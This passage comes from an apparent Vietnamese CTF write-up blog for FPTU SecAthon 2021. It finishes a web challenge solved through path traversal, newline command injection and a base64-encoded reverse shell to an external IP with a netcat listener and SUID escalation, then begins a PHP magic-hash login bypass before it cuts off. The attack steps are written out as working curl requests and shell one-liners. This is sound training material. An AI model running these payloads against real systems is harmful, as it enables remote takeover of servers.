      <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">scripts</span><span class="p">):</span>
          <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">scripts</span><span class="p">)</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">log</span><span class="p">):</span>
          <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
      <span class="k">try</span><span class="p">:</span>
          <span class="n">command_log</span> <span class="o">=</span> <span class="n">log</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">json</span><span class="p">[</span><span class="s">'command_log'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.txt'</span>
      <span class="k">except</span><span class="p">:</span>
          <span class="k">return</span> <span class="s">"missing command_log"</span>
      <span class="n">msg</span> <span class="o">=</span> <span class="n">check_script_dup</span><span class="p">(</span><span class="n">scripts</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">msg</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>M√¨nh s·∫Ω ƒë·ªÉ c·∫£ 5 h√†m n√†y chung v·ªõi nhau, v√¨ ch√∫ng li√™n quan m·∫≠t thi·∫øt v·ªõi nhau, v√† c≈©ng l√† ti·ªÅn ƒë·ªÅ cho m·ªçi th·ª©</p>
  </li>
  <li>
    <p>Ta c√≥ th·ª© t·ª± nh∆∞ sau:</p>

    <ul>
      <li>
        <p><code class="language-plaintext highlighter-rouge">runScript()</code> nh·∫≠n json t·ª´ request v√† truy·ªÅn cho h√†m <code class="language-plaintext highlighter-rouge">start()</code></p>

        <ul>
          <li>
            <p><code class="language-plaintext highlighter-rouge">start()</code> x·ª≠ l√Ω vi·ªác t·∫°o ra ƒë∆∞·ªùng d·∫´n th∆∞ m·ª•c cho <code class="language-plaintext highlighter-rouge">logs</code>, <code class="language-plaintext highlighter-rouge">scripts</code> v√† t·∫°o file <code class="language-plaintext highlighter-rouge">command_log</code> v√† ƒë∆∞a v√†o h√†m <code class="language-plaintext highlighter-rouge">check_script_dup()</code></p>
          </li>
          <li>
            <p><code class="language-plaintext highlighter-rouge">check_script_dup()</code> n√¥m na th√¨ ki·ªÉm tra xem file script ƒë√£ t·ªìn t·∫°i hay kh√¥ng, n·∫øu t·ªìn t·∫°i th√¨ t·∫•t nhi√™n l√† kh√¥ng c·∫ßn m·∫•t c√¥ng ƒë·∫øn h√†m ti·∫øp theo, h√†m <code class="language-plaintext highlighter-rouge">download_script()</code></p>
          </li>
          <li>
            <p><code class="language-plaintext highlighter-rouge">download_script()</code> l√† ph·∫ßn s·∫Ω ‚Äút·∫°o ra n·ªôi dung file‚Äù, b·∫±ng c√°ch nh·∫≠p file t·ª´ <code class="language-plaintext highlighter-rouge">url</code> trong JSON v√†o file <code class="language-plaintext highlighter-rouge">script</code>, ·ªü ƒë√¢y ta bi·∫øt ƒë∆∞·ª£c r·∫±ng, <code class="language-plaintext highlighter-rouge">url</code> ƒë√≥ s·∫Ω c√≥ d·∫°ng <code class="language-plaintext highlighter-rouge">http://localhost:8888/anything_else</code> v√¨ ƒëo·∫°n <code class="language-plaintext highlighter-rouge">#dont trust anyone</code>, h√£y nh·ªõ ƒëi·ªÅu n√†y</p>
          </li>
          <li>
            <p>Sau khi <code class="language-plaintext highlighter-rouge">download_script()</code> ho√†n t·∫•t, h√†m <code class="language-plaintext highlighter-rouge">run_script()</code> ƒë∆∞·ª£c kh·ªüi ƒë·ªông, h√†m n√†y s·∫Ω ch·∫°y m·ªôt c√¢u l·ªánh <code class="language-plaintext highlighter-rouge">bash &lt;script_bash&gt;</code>, v√† t·ª´ ƒë√¢y ta hi·ªÉu ƒë∆∞·ª£c 2 ƒëi·ªÅu:</p>

            <ul>
              <li>
                <p><code class="language-plaintext highlighter-rouge">script_bash</code> l√† t√™n file ƒë∆∞·ª£c th·ª±c thi b·ªõi l·ªánh <code class="language-plaintext highlighter-rouge">bash</code>, c√≥ n·ªôi dung ƒë∆∞·ª£c nh·∫≠p t·ª´ n√¥i dung file tr√™n <code class="language-plaintext highlighter-rouge">url</code> c·ªßa JSON truy·ªÅn v√†o</p>
              </li>
              <li>
                <p><code class="language-plaintext highlighter-rouge">command_log</code> ch√≠nh l√† file log c·ªßa <code class="language-plaintext highlighter-rouge">stdout</code> v√† <code class="language-plaintext highlighter-rouge">stderr</code>, nh∆∞ v·∫≠y khi th·ª±c thi, output v√† th√¥ng b√°o l·ªói c·ªßa <code class="language-plaintext highlighter-rouge">bash</code> ƒë·ªÅu s·∫Ω ƒë·∫©y v√†o file log ƒë√≥, v√† t·∫•t nhi√™n, ta c√≥ th·ªÉ xem file log ƒë√≥ qua path traversal</p>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <p>ƒê·∫øn ƒë√¢y th√¨ m√¨nh (v√† tin ch·∫Øc ai ƒë√≥ khi xem WU n√†y), ch·∫Øc h·∫≥n ƒë·ªÅu ƒë√£ nghƒ© ra r·ªìi, t√°c gi·∫£ c≈©ng ƒë√£ ra hint <code class="language-plaintext highlighter-rouge">suprocess.Popen(), stderr, stdout l√† g√¨?</code> r·ªìi :v</p>
  </li>
  <li>
    <p>M√¨nh th·ª≠ lu√¥n nh√© :v Nh∆∞ ·ªü tr√™n ta ƒë√£ c√≥ JSON bao g·ªìm <code class="language-plaintext highlighter-rouge">dir</code>, <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">command_log</code>, <code class="language-plaintext highlighter-rouge">url</code></p>
  </li>
  <li>
    <p>URL ƒë·ªÉ nh·∫≠n file JSON l√† <code class="language-plaintext highlighter-rouge">http://139.180.208.121:8001/runScript</code>, ƒë·ªÉ g·ª≠i JSON l√™n th√¨ m√¨nh s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">curl</code> nh∆∞ sau:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{json}'</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>M√¨nh s·∫Ω th·ª≠ t·∫°o m·ªôt JSON nh∆∞ sau:</p>

    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="p">{</span><span class="w">
      </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"test"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"ls"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"log"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>
    <p>Gh√©p l·∫°i v·ªõi <code class="language-plaintext highlighter-rouge">curl</code>:</p>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "test", "name" : "ls", "command_log" : "log", "url" : "http://localhost:8888/"}'</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>V√† sau khi g·ª≠i, truy c·∫≠p v√†o <code class="language-plaintext highlighter-rouge">http://139.180.208.121:8001/getData?f=/fus/data/../logs/log.txt</code> ƒë·ªÉ xem k·∫øt qu·∫£ c·ªßa c√¢u l·ªánh l√† g√¨ (ta bi·∫øt <code class="language-plaintext highlighter-rouge">logs</code> c√πng chung th∆∞ m·ª•c cha v·ªõi <code class="language-plaintext highlighter-rouge">data</code> khi xem code):</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_2.png" alt="curl" /></p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_3.png" alt="log.txt" /></p>
  </li>
  <li>
    <p>C√≥ th·ªÉ th·∫•y r·∫±ng, n·ªôi dung file ch√≠nh<code class="language-plaintext highlighter-rouge">log.txt</code> ch√≠nh l√† bi·∫øn <code class="language-plaintext highlighter-rouge">script_path</code> ƒë∆∞·ª£c ra th√™m c·∫£ <code class="language-plaintext highlighter-rouge">response</code> c·ªßa <code class="language-plaintext highlighter-rouge">index()</code>, ch√∫ng tr√™n m·ªôt d√≤ng n√™n s·∫Ω b·ªã l·ªói, th·ª≠ ƒë·ªïi <code class="language-plaintext highlighter-rouge">ls</code> th√†nh <code class="language-plaintext highlighter-rouge">\nls\n</code> ·ªü JSON v√† g·ª≠i l√™n, s·∫Ω th·∫•y s·ª± kh√°c bi·ªát:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_4.png" alt="curl_1" /></p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_5.png" alt="log.txt_1" /></p>
  </li>
  <li>
    <p>Th·∫•y r√µ l√† <code class="language-plaintext highlighter-rouge">ls</code> ƒë√£ th·ª•t xu·ªëng, v·∫≠y ƒëi·ªÅu n√†y c√≥ √Ω nghƒ©a g√¨? <code class="language-plaintext highlighter-rouge">bash &lt;filename&gt;</code> khi ch·∫°y s·∫Ω ch·∫°y t·ª´ tr√™n xu·ªëng nh∆∞ c√°c ng√¥n ng·ªØ l·∫≠p tr√¨nh, nh∆∞ng c√≥ m·ªôt ƒëi·ªÅu ƒë·∫∑c bi·ªát l√†, h√†ng n√†o l·ªói, n√≥ s·∫Ω in ra l·ªói v√† ch·∫°y h√†ng ti·∫øp theo, ch·ª© kh√¥ng d·ª´ng l·∫°i khi g·∫∑p l·ªói syntax b√™n trong</p>
  </li>
  <li>
    <p>ƒê·∫øn ƒë√¢y th√¨ m√¨nh ƒë√£ nh·∫≠n ra, h√†m <code class="language-plaintext highlighter-rouge">download_script()</code>, v·∫≠y s·∫Ω ra sao n·∫øu m√¨nh truy·ªÅn v√†o <code class="language-plaintext highlighter-rouge">url</code> trong JSON l√† <code class="language-plaintext highlighter-rouge">http://localhost:8888/getData?f=/fus/data/../logs/log.txt</code> (n√™n l∆∞u √Ω <code class="language-plaintext highlighter-rouge">localhost</code> ·ªü ƒë√¢y l√† local c·ªßa server :&gt; ), th√¨ c√≥ ph·∫£i <code class="language-plaintext highlighter-rouge">download_script()</code> s·∫Ω l·∫•y n·ªôi dung c·ªßa <code class="language-plaintext highlighter-rouge">log.txt</code> ƒë·ªÉ ƒë∆∞a v√†o <code class="language-plaintext highlighter-rouge">script_path</code>?</p>
  </li>
  <li>
    <p>Nh∆∞ v·∫≠y m√¨nh t·∫°o JSON m·ªõi v√† l·ªánh <code class="language-plaintext highlighter-rouge">curl</code> m·ªõi nh∆∞ sau:</p>

    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="p">{</span><span class="w">
      </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"test"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"ls.sh"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"lssh"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/getData?f=/fus/data/../logs/log.txt"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span></code></pre></div>    </div>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "test", "name" : "ls.sh", "command_log" : "lssh", "url" : "http://localhost:8888/getData?f=/fus/data/../logs/log.txt"}'</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>V√† g·ª≠i ƒëi, gi·ªù ch·ªâ c·∫ßn m·ªü file <code class="language-plaintext highlighter-rouge">lssh.txt</code> b·∫±ng path traversal v√† thu ƒë∆∞·ª£c k·∫øt qu·∫£:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_6.png" alt="curl_2" /></p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_7.png" alt="lssh.txt" /></p>
  </li>
  <li>
    <p>V·∫≠y l√† ch√≠nh x√°c r·ªìi, nh∆∞ng c√≥ m·ªôt v·∫•n ƒë·ªÅ l√† ta c·∫ßn t√¨m ƒë·∫øn <code class="language-plaintext highlighter-rouge">/root</code> ƒë·ªÉ m·ªü file <code class="language-plaintext highlighter-rouge">secret_service</code>, v√† t·∫•t nhi√™n l√† ph·∫£i root th√¨ m·ªõi c√≥ th·ªÉ l√†m ƒë∆∞·ª£c ƒëi·ªÅu ƒë√≥ (m√¨nh ƒë√£ th·ª≠ r·ªìi)</p>
  </li>
  <li>
    <p>M·ª• m·∫´m c·∫£ ƒë·∫ßu th√¨ anh T gi·∫•u t√™n v√† anh Khoa (t√°c gi·∫£) ƒë√£ g·ª£i √Ω v·ªÅ <code class="language-plaintext highlighter-rouge">reverse shell</code></p>
  </li>
  <li>
    <p>V·∫≠y b√¢y gi·ªù ch·ªâ c·∫ßn d√πng c√°ch tr√™n, t·∫°o m·ªôt file ch·∫°y m·ªôt ƒëo·∫°n reverse shell v√† ch√∫ng ta s·∫Ω chi·∫øm quy·ªÅn th√¥ng qua SUID (hint t·ª´ t√°c gi·∫£) l√† xong</p>
  </li>
  <li>
    <p>Nh∆∞ng, m√¨nh ƒë√£ th·ª≠ v√† nh·∫≠n ra, t·∫•t c·∫£ nh·ªØng command m√† ch·ª©a d·∫•u ‚Äò/‚Äô th√¨ l·ªói 500 l√† r√µ, nh∆∞ ·ªü d∆∞·ªõi m√¨nh ƒë·ªÉ <code class="language-plaintext highlighter-rouge">name</code> trong JSON l√† <code class="language-plaintext highlighter-rouge">\nls ../root\n</code>:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_8.png" alt="500" /></p>
  </li>
  <li>
    <p>V·∫≠y l√† m√¨nh c·∫ßn c√°ch kh√°c, nh∆∞ng tr∆∞·ªõc ti√™n, ph·∫£i chu·∫©n b·ªã c√°i reverse shell ƒë√£ :D</p>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/34.92.153.161/8899 0&gt;&amp;1
</code></pre></div>    </div>
  </li>
  <li>
    <p>C√≥ c·∫£ revshell c·ªßa <code class="language-plaintext highlighter-rouge">bash</code>, <code class="language-plaintext highlighter-rouge">nc</code>, ‚Ä¶, t√¨m hi·ªÉu t·∫°i <a href="https://www.revshells.com/">ƒë√¢y</a></p>
  </li>
  <li>
    <p>V·∫´n l√† t√°c gi·∫£ ƒë√£ g·ª£i √Ω cho m√¨nh m·ªôt c√°ch ƒë·ªÉ ƒë·∫©y ƒë∆∞·ª£c revshell kia l√™n, s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">base64</code>, chuy·ªÉn ƒëo·∫°n shell ·ªü tr√™n th√†nh <code class="language-plaintext highlighter-rouge">base64</code> encode, v√† ƒë∆∞a v·ªÅ d·∫°ng sau:</p>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">echo</span> <span class="s2">"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjEK"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
</code></pre></div>    </div>
  </li>
  <li>
    <p>V·∫≠y l√† xong, gi·ªù c·∫ßn chu·∫©n b·ªã request ƒë·∫ßu ti√™n (h√£y nh·ªõ escape string :v):</p>

    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="p">{</span><span class="w">
      </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"</span><span class="se">\n</span><span class="s2">echo </span><span class="se">\"</span><span class="s2">c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=</span><span class="se">\"</span><span class="s2"> | base64 -d | bash</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span></code></pre></div>    </div>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "rev","name" : "\necho \"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=\" | base64 -d | bash\n","command_log" : "rev","url" : "http://localhost:8888/"}'</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>G·ª≠i ƒëi, v√† tr∆∞·ªõc khi ƒë·∫øn v·ªõi l·∫ßn request th·ª© 2, m√¨nh ph·∫£i t·∫°o m·ªôt listener tr√™n m√°y c·ªßa m√¨nh ƒë√£ (th·ª±c ra l√† VPS m√¨nh m∆∞·ª£n c·ªßa m·ªôt ng∆∞·ªùi b·∫°n x·ª© c·∫£ng):</p>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nc <span class="nt">-lvnp</span> 8899
</code></pre></div>    </div>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_9.png" alt="listener" /></p>
  </li>
  <li>
    <p>Gi·ªù ƒë·ªÉ listener ·ªü ƒë√≥, ta quay l·∫°i v·ªõi request th·ª© 2, request ƒë·ªÉ ch·∫°y revshell:</p>

    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="p">{</span><span class="w">
      </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev_tcp"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev_tcp.sh"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span></code></pre></div>    </div>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "rev_tcp","name" : "rev_tcp.sh","command_log" : "rev","url" : "http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"}'</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>V√† g·ª≠i ƒëi, r·ªìi quay l·∫°i listener:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_10.png" alt="revshell" /></p>
  </li>
  <li>
    <p>V·∫≠y l√† ta ƒë√£ m·ªü ƒë∆∞·ª£c reverse shell tr√™n server</p>
  </li>
  <li>
    <p>B√¢y gi·ªù ch·ªâ c·∫ßn ti·∫øn h√†nh <a href="https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd">leo thang ƒë·∫∑c quy·ªÅn</a> th√¥i:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_11.png" alt="done" /></p>
  </li>
  <li>
    <p>Ta c√≥ flag: <code class="language-plaintext highlighter-rouge">"FUSec{a9595511e650bb0ff367d8144818802b}"</code></p>
  </li>
</ul>

<blockquote>
  <p>C·∫£m ∆°n anh Khoa v√† anh T gi·∫•u t√™n (kh√¥ng l·ª´a) ƒë√£ lu√¥n h·ªó tr·ª£, ƒë·∫•m m·ªìm th·∫±ng em ƒë·ªÉ em c√≥ th·ªÉ gi·∫£i ƒë∆∞·ª£c b√†i n√†y</p>
</blockquote>

<blockquote>
  <p>M√¨nh c≈©ng xin c·∫£m ∆°n ng∆∞·ªùi b·∫°n ƒë·∫øn t·ª´ ƒë·∫•t c·∫£ng Mai Kim Long, m·∫∑c d√π ch·ªâ quen bi·∫øt qua m·∫°ng x√£ h·ªôi nh∆∞ng v·∫´n d√°m cho m√¨nh m∆∞·ª£n t√†i kho·∫£n GCP ƒë·ªÉ l√†m b√†i n√†y, thanks bro!</p>
</blockquote>]]></content><author><name></name></author><summary type="html"><![CDATA[PRP201]]></summary></entry><entry><title type="html">FPTU SecAthon 2021 | Web Writeup | IAW302</title><link href="/2021/10/09/FuSec4-IAW302.html" rel="alternate" type="text/html" title="FPTU SecAthon 2021 | Web Writeup | IAW302" /><published>2021-10-09T16:30:00+00:00</published><updated>2021-10-09T16:30:00+00:00</updated><id>/2021/10/09/FuSec4-IAW302</id><content type="html" xml:base="/2021/10/09/FuSec4-IAW302.html"><![CDATA[<h1 id="iaw302">IAW302</h1>

<blockquote>
  <p>B√†i n√†y r·∫•t ƒë√∫ng v·ªõi m√¥ t·∫£ c·ªßa ng∆∞·ªùi ra ƒë·ªÅ, m·ªôt ng∆∞·ªùi anh (kh√¥ng h·ªÅ) l·ª´a: ‚ÄúG(old)‚Äù. M·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh cho m·ªôt l·ªói ƒëi·ªÉn h√¨nh c·ªßa PHP String :))</p>
</blockquote>

<ul>
  <li>
    <p>Truy c·∫≠p v√†o b√†i, ta c√≥ login form:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_1.png" alt="login" /></p>
  </li>
  <li>
    <p>Th·ª≠ xem source code c·ªßa b√†i xem sao? (Source code kh√° d√†i, n√™n m√¨nh s·∫Ω c·∫Øt t·ª´ ƒëo·∫°n form ƒë·∫øn h·∫øt hint)</p>

    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"verify.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
      User Name:<span class="nt">&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span><span class="nt">&gt;&lt;br&gt;&lt;br&gt;</span>
      Password:<span class="nt">&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span><span class="nt">&gt;&lt;br&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Login"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
  <span class="c">&lt;!--
  if(isset($_POST['submit'])){
          if ((int) $_POST['password'] === (int) "8xdeadbeef"){
              $usr = $_POST['username'];
              $pas = hash('sha256', htmlentities($_POST['password']));
              if($pas == "0" &amp;&amp; strcmp("ahihi", $usr) == 0 &amp;&amp; $usr != "ahihi"){
                  session_start();
                  $_SESSION['logged'] = TRUE;
                  header("Location: chall.php");
                  exit;
                  }
          }else{

              header("Location: index.php");
              exit;
          }
  }else{
          header("Location: index.php");
          exit;
  }
  ?&gt;
</span></code></pre></div>    </div>
  </li>
  <li>
    <p>V·∫≠y l√† ch√∫ng ta c√≥ g·ª£i √Ω v·ªÅ code PHP c·ªßa back-end, h√£y th·ª≠ ph√¢n t√≠ch n√≥ m·ªôt ch√∫t, ƒë·ªÉ d·ªÖ d√†ng theo d√µi, m√¨nh s·∫Ω g√°n ƒëo·∫°n PHP v√†o Vim ƒë·ªÉ nh√¨n theo line-number:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_2.png" alt="PHP" /></p>
  </li>
  <li>
    <p>T·∫°i d√≤ng th·ª© 3, ta c√≥ th·ªÉ th·∫•y to√°n t·ª≠ so s√°nh <code class="language-plaintext highlighter-rouge">===</code> (c√πng lo·∫°i, c√πng gi√° tr·ªã), <code class="language-plaintext highlighter-rouge">(int) "8xdeadbeef"</code> c√≥ gi√° tr·ªã l√† <code class="language-plaintext highlighter-rouge">8</code>, nh∆∞ v·∫≠y password c·∫ßn mang gi√° tr·ªã <code class="language-plaintext highlighter-rouge">8</code> khi √©p v·ªÅ <code class="language-plaintext highlighter-rouge">int</code></p>
  </li>
  <li>
    <p>N√≥i qua m·ªôt ch√∫t v·ªÅ vi·ªác √©p <code class="language-plaintext highlighter-rouge">String</code> v·ªÅ <code class="language-plaintext highlighter-rouge">Integer</code> trong PHP, h√£y ƒë·ªÉ √Ω chu·ªói <code class="language-plaintext highlighter-rouge">8xdeafbeef</code>, chu·ªói n√†y b·∫Øt ƒë·∫ßu b·∫±ng s·ªë <code class="language-plaintext highlighter-rouge">8</code>, n√™n khi √©p v·ªÅ <code class="language-plaintext highlighter-rouge">int</code> th√¨ s·∫Ω mang lu√¥n gi√° tr·ªã l√† <code class="language-plaintext highlighter-rouge">8</code>, ƒë·ªÉ d·ªÖ h√¨nh dung th√¨ ch√∫ng ta th·ª≠ tr√™n PHP lu√¥n:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/IAW302_3.png" alt="php -a" /></p>
  </li>
  <li>
    <p>Nh∆∞ v·∫≠y ta bi·∫øt password s·∫Ω b·∫Øt ƒë·∫ßu b·∫±ng <code class="language-plaintext highlighter-rouge">8</code> v√† k·∫ø ti·∫øp l√† c√°c k√≠ t·ª± kh√¥ng ph·∫£i k√≠ t·ª± s·ªë nh∆∞ <code class="language-plaintext highlighter-rouge">8anhtunglua</code> ch·∫≥ng h·∫°n :&gt;</p>
  </li>
  <li>
    <p>Ta bi·∫øt password s·∫Ω ƒë∆∞·ª£c hash <code class="language-plaintext highlighter-rouge">SHA256</code>, v√† kh√¥ng c√≥ salt (D√≤ng 5)</p>
  </li>
  <li>
    <p>T·∫°i d√≤ng 6 ta c√≥ 3 ƒëi·ªÅu ki·ªán v·ªõi 3 ph√©p so s√°nh: <code class="language-plaintext highlighter-rouge">==</code> v√† <code class="language-plaintext highlighter-rouge">!=</code> (so s√°nh gi√° tr·ªã, kh√¥ng so s√°nh ki·ªÉu) v√† <code class="language-plaintext highlighter-rouge">strcmp()</code> (so s√°nh 2 string, tr·∫£ v·ªÅ 0 n·∫øu gi·ªëng nhau):</p>
  </li>
  <li>
    <p>H√£y ƒë·ªÉ √Ω ƒë·∫øn ph√©p so s√°nh <code class="language-plaintext highlighter-rouge">$pas == "0"</code>, ƒë√¢y l√† m·ªôt huy·ªÅn tho·∫°i c·ªßa PHP :&gt; Ta bi·∫øt r·∫±ng <code class="language-plaintext highlighter-rouge">$pas</code> ƒë∆∞·ª£c hash <code class="language-plaintext highlighter-rouge">SHA256</code> r·ªìi m·ªõi ƒëem v√†o so s√°nh, ph√©p so s√°nh <code class="language-plaintext highlighter-rouge">==</code> gi·ªØa m·ªôt chu·ªói hash v√† <code class="language-plaintext highlighter-rouge">"0"</code> trong PHP s·∫Ω g√¢y ra l·ªói li√™n quan ƒë·∫øn Magic Hash, c·ª• th·ªÉ th√¨ nh·ªØng chu·ªói hash b·∫Øt ƒë·∫ßu b·∫±ng <code class="language-plaintext highlighter-rouge">"0e"</code>, khi so s√°nh <code class="language-plaintext highlighter-rouge">==</code> v·ªõi <code class="language-plaintext highlighter-rouge">"0"</code> s·∫Ω lu√¥n tr·∫£ v·ªÅ gi√° tr·ªã ƒë√∫ng xD, b·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu v·ªÅ magic hash, kh√¥ng ch·ªâ <code class="language-plaintext highlighter-rouge">SHA256</code> m√† c√≤n nhi·ªÅu d·∫°ng kh√°c <a href="https://github.com/spaze/hashes">t·∫°i ƒë√¢y</a></p>
  </li>
  <li>
